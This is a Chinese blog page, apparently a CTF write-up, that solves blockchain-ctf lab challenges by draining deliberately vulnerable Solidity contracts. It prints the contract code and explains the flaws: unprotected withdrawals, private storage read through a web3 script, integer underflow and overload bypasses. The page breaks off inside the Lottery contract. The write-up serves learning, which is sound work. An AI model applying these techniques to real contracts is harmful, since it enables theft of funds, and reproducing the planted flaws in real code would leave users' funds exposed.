@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/bcYng-w/images/main/32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/bcYng-w/images/main/16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":4},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="题库地址：https:&#x2F;&#x2F;blockchain-ctf.securityinnovation.com&#x2F;#&#x2F; 该题库所有题目任务都是偷走合约中的全部余额">
+<meta property="og:type" content="article">
+<meta property="og:title" content="blockchain-ctf靶场刷题part1&#x2F;2">
+<meta property="og:url" content="http://example.com/2022/03/19/blockchain-ctf%E4%B8%8A/index.html">
+<meta property="og:site_name" content="until">
+<meta property="og:description" content="题库地址：https:&#x2F;&#x2F;blockchain-ctf.securityinnovation.com&#x2F;#&#x2F; 该题库所有题目任务都是偷走合约中的全部余额">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-19T05:31:34.297Z">
+<meta property="article:modified_time" content="2022-03-19T05:32:43.269Z">
+<meta property="article:author" content="bcYng">
+<meta property="article:tag" content="区块链">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/03/19/blockchain-ctf%E4%B8%8A/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>blockchain-ctf靶场刷题part1/2 | until</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">until</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/blockchain-ctf%E4%B8%8A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/bcYng-w/images/main/touxaing.png">
+      <meta itemprop="name" content="bcYng">
+      <meta itemprop="description" content="前程似锦">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="until">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          blockchain-ctf靶场刷题part1/2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-19 13:31:34 / 修改时间：13:32:43" itemprop="dateCreated datePublished" datetime="2022-03-19T13:31:34+08:00">2022-03-19</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>题库地址：<a target="_blank" rel="noopener" href="https://blockchain-ctf.securityinnovation.com/#/">https://blockchain-ctf.securityinnovation.com/#/</a></p>
+<p>该题库所有题目任务都是偷走合约中的全部余额</p>
+<span id="more"></span>
+
+<h1 id="1-Donation"><a href="#1-Donation" class="headerlink" title="1.Donation"></a>1.Donation</h1><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line">import &quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Donation is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    uint256 public funds;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        funds = funds.add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function() external payable ctf&#123;</span><br><span class="line">        funds = funds.add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf&#123;</span><br><span class="line">        msg.sender.transfer(funds);</span><br><span class="line">        funds = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>这一关没什么难度，直接调用withdrawDonationsFromTheSuckersWhoFellForIt()就可以了</p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>复制合约以及合约地址，在remix中ataddress并进行调用即可</p>
+<h1 id="2-Lock-Box"><a href="#2-Lock-Box" class="headerlink" title="2.Lock Box"></a>2.Lock Box</h1><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Lockbox1 is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    uint256 private pin;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        pin = now%10000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unlock(uint256 _pin) external ctf&#123;</span><br><span class="line">        require(pin == _pin, &quot;Incorrect PIN&quot;);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h2><p>这道题考验了智能合约的变量存储机制，想要完成该题需要知道pin，而pin是private存储方式，可以使用web3脚本进行获得，pin存储在slot0，直接获得即可。</p>
+<h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3,HTTPProvider</span><br><span class="line">w3=Web3(HTTPProvider(<span class="string">&#x27;https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431&#x27;</span>))</span><br><span class="line">baddress=<span class="string">&#x27;0xb7f93403a2215240f29e7e502dcc497cf3d893a0&#x27;</span></span><br><span class="line">address=Web3.toChecksumAddress(baddress)</span><br><span class="line"><span class="built_in">print</span>(w3.eth.getStorageAt(address,<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在进行调用即可</p>
+<h1 id="3-Piggy-Bank"><a href="#3-Piggy-Bank" class="headerlink" title="3.Piggy Bank"></a>3.Piggy Bank</h1><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line">import &quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PiggyBank is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    uint256 public piggyBalance;</span><br><span class="line">    string public name;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    constructor(address _ctfLauncher, address _player, string _name) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        name=_name;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        piggyBalance=piggyBalance.add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function() external payable ctf&#123;</span><br><span class="line">        piggyBalance=piggyBalance.add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Unauthorized: Not Owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) internal&#123;</span><br><span class="line">        piggyBalance = piggyBalance.sub(amount);</span><br><span class="line">        msg.sender.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectFunds(uint256 amount) public onlyOwner ctf&#123;</span><br><span class="line">        require(amount&lt;=piggyBalance, &quot;Insufficient Funds in Contract&quot;);</span><br><span class="line">        withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract CharliesPiggyBank is PiggyBank&#123;</span><br><span class="line">    </span><br><span class="line">    uint256 public withdrawlCount;</span><br><span class="line">    </span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        PiggyBank(_ctfLauncher, _player, &quot;Charlie&quot;) </span><br><span class="line">    &#123;</span><br><span class="line">        withdrawlCount = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function collectFunds(uint256 amount) public ctf&#123;</span><br><span class="line">        require(amount&lt;=piggyBalance, &quot;Insufficient Funds in Contract&quot;);</span><br><span class="line">        withdrawlCount = withdrawlCount.add(1);</span><br><span class="line">        withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h2><p>PiggyBank里的withdraw标了internal，只能在内部调用。collectFunds又有onlyOwner，基本安全。</p>
+<p>但CharliesPiggyBank在继承时为了制造漏洞强行重写了collectFunds，去掉了msg.sender的限制。</p>
+<h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><p>计算数值直接调用即可</p>
+<h1 id="4-SI-Token-Sale"><a href="#4-SI-Token-Sale" class="headerlink" title="4.SI Token Sale"></a>4.SI Token Sale</h1><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line"></span><br><span class="line">// https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol</span><br><span class="line">import &quot;../StandardToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SIToken is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;SIToken&quot;;</span><br><span class="line">    string public symbol = &quot;SIT&quot;;</span><br><span class="line">    uint public decimals = 18;</span><br><span class="line">    uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);</span><br><span class="line"></span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">        balances[this] = INITIAL_SUPPLY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SITokenSale is SIToken, CtfFramework &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public feeAmount;</span><br><span class="line">    uint256 public etherCollection;</span><br><span class="line">    address public developer;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        feeAmount = 10 szabo; </span><br><span class="line">        developer = msg.sender;</span><br><span class="line">        purchaseTokens(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseTokens(uint256 _value) internal&#123;</span><br><span class="line">        require(_value &gt; 0, &quot;Cannot Purchase Zero Tokens&quot;);</span><br><span class="line">        require(_value &lt; balances[this], &quot;Not Enough Tokens Available&quot;);</span><br><span class="line">        balances[msg.sender] += _value - feeAmount;</span><br><span class="line">        balances[this] -= _value;</span><br><span class="line">        balances[developer] += feeAmount; </span><br><span class="line">        etherCollection += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable external ctf&#123;</span><br><span class="line">        purchaseTokens(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allow users to refund their tokens for half price ;-)</span><br><span class="line">    function refundTokens(uint256 _value) external ctf&#123;</span><br><span class="line">        require(_value&gt;0, &quot;Cannot Refund Zero Tokens&quot;);</span><br><span class="line">        transfer(this, _value);</span><br><span class="line">        etherCollection -= _value/2;</span><br><span class="line">        msg.sender.transfer(_value/2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawEther() external ctf&#123;</span><br><span class="line">        require(msg.sender == developer, &quot;Unauthorized: Not Developer&quot;);</span><br><span class="line">        require(balances[this] == 0, &quot;Only Allowed Once Sale is Complete&quot;);</span><br><span class="line">        msg.sender.transfer(etherCollection);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h2><p>题目漏洞比较简单，就是一步整数溢出漏洞 </p>
+<h2 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h2><p>balances[msg.sender] +&#x3D; _value – feeAmount，当value足够小时，balances[msg.sender]溢出为大整数。查看etherCollection，并计算二倍值调用refundTokens()即可</p>
+<h1 id="5-Secure-Bank"><a href="#5-Secure-Bank" class="headerlink" title="5.Secure Bank"></a>5.Secure Bank</h1><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SimpleBank is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        balances[msg.sender] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address _user) public payable ctf&#123;</span><br><span class="line">        balances[_user] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(address _user, uint256 _value) public ctf&#123;</span><br><span class="line">        require(_value&lt;=balances[_user], &quot;Insufficient Balance&quot;);</span><br><span class="line">        balances[_user] -= _value;</span><br><span class="line">        msg.sender.transfer(_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable ctf&#123;</span><br><span class="line">        deposit(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MembersBank is SimpleBank&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; string) public members;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        SimpleBank(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function register(address _user, string _username) public ctf&#123;</span><br><span class="line">        members[_user] = _username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isMember(address _user)&#123;</span><br><span class="line">        bytes memory username = bytes(members[_user]);</span><br><span class="line">        require(username.length != 0, &quot;Member Must First Register&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address _user) public payable isMember(_user) ctf&#123;</span><br><span class="line">        super.deposit(_user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(address _user, uint256 _value) public isMember(_user) ctf&#123;</span><br><span class="line">        super.withdraw(_user, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SecureBank is MembersBank&#123;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        MembersBank(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address _user) public payable ctf&#123;</span><br><span class="line">        require(msg.sender == _user, &quot;Unauthorized User&quot;);</span><br><span class="line">        require(msg.value &lt; 100 ether, &quot;Exceeding Account Limits&quot;);</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;Does Not Satisfy Minimum Requirement&quot;);</span><br><span class="line">        super.deposit(_user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(address _user, uint8 _value) public ctf&#123;</span><br><span class="line">        require(msg.sender == _user, &quot;Unauthorized User&quot;);</span><br><span class="line">        require(_value &lt; 100, &quot;Exceeding Account Limits&quot;);</span><br><span class="line">        require(_value &gt;= 1, &quot;Does Not Satisfy Minimum Requirement&quot;);</span><br><span class="line">        super.withdraw(_user, _value * 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function register(address _user, string _username) public ctf&#123;</span><br><span class="line">        require(bytes(_username).length!=0, &quot;Username Not Enough Characters&quot;);</span><br><span class="line">        require(bytes(_username).length&lt;=20, &quot;Username Too Many Characters&quot;);</span><br><span class="line">        super.register(_user, _username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h2><p>函数重写重载问题， 存在function withdraw(address _user, uint256 _value) public isMember(_user) ctf和  function withdraw(address _user, uint8 _value) public ctf两个函数，第一个是uint256并且没有限制msg.sender &#x3D;&#x3D; _user</p>
+<h2 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h2><p>在区块链浏览器中找到有钱的user进行register之后调用withdraw即可</p>
+<h1 id="6-Lottery"><a href="#6-Lottery" class="headerlink" title="6.Lottery"></a>6.Lottery</h1><h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line">import &quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Lottery is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    uint256 public totalPot;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        totalPot = totalPot.add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">    